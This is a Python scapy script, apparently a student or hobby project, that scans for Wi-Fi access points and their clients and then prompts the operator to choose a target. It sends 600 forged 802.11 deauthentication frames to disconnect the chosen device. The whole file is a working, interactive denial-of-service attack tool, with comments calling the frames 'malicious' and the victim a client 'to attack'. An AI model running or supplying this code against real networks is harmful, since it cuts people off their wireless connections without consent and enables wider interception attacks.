from scapy.all import *
import string
import threading
import os, time
import random

client_list = []  # an empye list of clients
numPackets = 600  # The number of packets we want to send to the selected client
channel = 0
APs = []
macTarget = ""
hopperMode = False

network_card = input("Please enter your network card name: ")

"""" In this function we create a packet filter function which takes a packet as an input.
Then it checks whether the packet has a Dot11 layer or not.
Then it checks if it is a beacon or not (type & subtype). 
Lastly, it adds it to the ap_list list and prints out the MAC address and the SSID on screen.
pkt.type == 0, this filter helps us filter management frame from packet.
pkt.subtype == 8, this filter helps us filter beacon from captured packets ."""


def scan(pkt):
    if pkt.haslayer(Dot11):
        if (pkt.subtype == 8 and pkt.type == 0):
            if [pkt.addr2, pkt.info, int(ord(pkt[Dot11Elt:3].info))] not in APs:
                APs.append([pkt.addr2, pkt.info, int(ord(pkt[Dot11Elt:3].info))])
                print("AP: %s SSID: %s Channel: %d" % (pkt.addr2, pkt.info, int(ord(pkt[Dot11Elt:3].info))))


def showAPs():
    sniff(iface=network_card, prn=scan, timeout=60)  # sniff function helps us capture all traffic
    for x in range(len(APs)):
        print(x, APs[x][1], APs[x][0])  # print all APs that found

    result_AP = int(input("Please choose number of AP to attack: "))
    hopperMode = True
    channelChange(APs[result_AP][2])  # Set the channel of the selected AP
    scan_clients(APs[result_AP][0])  # Search all clients on the selected AP


def scan_clients(rmac):
    global macTarget
    macTarget = rmac
    sniff(iface=network_card, prn=onlyClients, timeout=60)  # sniff function helps us capture all traffic
    # here we disconnect the chosen device from AP
    if (len(client_list) == 0):  # If no devices were found on the AP
        print("Couldn't find clients, searching again")
        scan_clients(macTarget)

    for x in range(len(client_list)):
        print(x, client_list[x])  # print the mac address of clients

    choice_client = int(input("Please choose number of client to attack: "))

    for y in range(numPackets):
        pkt = RadioTap() / Dot11(addr1=client_list[choice_client], addr2=macTarget,
                                 addr3=macTarget) / Dot11Deauth()  # creating a malicious packet
        sendp(pkt, iface=network_card)  # sending the packet to the mac address which we want to attack


def onlyClients(pkt):
    global client_list
    if ((pkt.addr2 == macTarget or pkt.addr3 == macTarget) and pkt.addr1 != "ff:ff:ff:ff:ff:ff"):
        if pkt.addr1 not in client_list:
            if pkt.addr2 != pkt.addr1 and pkt.addr1 != pkt.addr3:  # addr1 – destination/recipient addr2 – relay/source addr3 – BSSID
                client_list.append(pkt.addr1)


# Enter monitor mode
def monitor_mode():
    os.system('sudo ifconfig %s down' % network_card)
    os.system('sudo iwconfig %s mode monitor' % network_card)
    os.system('sudo ifconfig %s up' % network_card)


def channelChange(channel):
    os.system('iwconfig %s channel %d' % (network_card, channel))


def hopper(iface):
    n = 1
    while not hopperMode:
        time.sleep(0.50)
        os.system('iwconfig %s channel %d' % (iface, n))
        d = int(random.random() * 14)
        if d != n and d != 0:
            n = d


if __name__ == "__main__":
    thread = threading.Thread(target=hopper, args=(network_card,), name="hopper")
    thread.daemon = True
    thread.start()
    monitor_mode()
    print("Searching for APs, please wait")

    showAPs()









